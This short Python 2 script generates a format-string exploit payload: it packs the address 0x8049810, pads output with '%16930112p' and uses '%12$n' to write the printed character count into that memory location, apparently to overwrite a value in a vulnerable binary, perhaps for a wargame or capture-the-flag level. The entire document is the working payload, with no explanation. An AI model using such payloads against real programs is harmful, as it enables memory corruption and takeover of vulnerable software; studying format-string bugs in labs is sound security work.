import struct

target_address = struct.pack ("I", 0x8049810)
lfant = "%16930112p"
print target_address + lfant + "%12$n"